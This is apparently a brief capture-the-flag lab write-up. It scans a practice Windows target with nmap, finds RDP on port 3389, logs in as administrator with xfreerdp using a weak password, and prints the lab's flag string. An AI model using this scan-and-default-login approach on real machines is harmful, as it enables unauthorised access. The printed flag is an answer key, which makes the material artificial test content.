RDP stands for Remote Desktop Protocol
telnet is the name of the old remote access tool that came without encryption by default on port 23
the service running on port 3389 is `ms-wbt-server`

```php
nmap -sC -A 10.129.1.13
>135/tcp  open  msrpc         Microsoft Windows RPC
>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
>445/tcp  open  microsoft-ds?
>3389/tcp open  ms-wbt-server Microsoft Terminal Services
>|_ssl-date: 2025-05-30T05:29:59+00:00; 0s from scanner time.
>| ssl-cert: Subject: commonName=Explosion
>| Not valid before: 2025-05-29T05:27:26
>|_Not valid after:  2025-11-28T05:27:26
```

Were interested in port 3389
the service running on it is `ms-wbt-server`

we will use a tool called `xfreerdp`
log into the targets machine with the password administrator

```php
xfreerdp /v:10.129.1.13 -u administrator
```

Loads a dynamic virtual channel for us
there is a file called `flag.txt` on the desktop 
It has the string `951fa96d7830c451b536be5a6be008a0`

we have rooted this machine

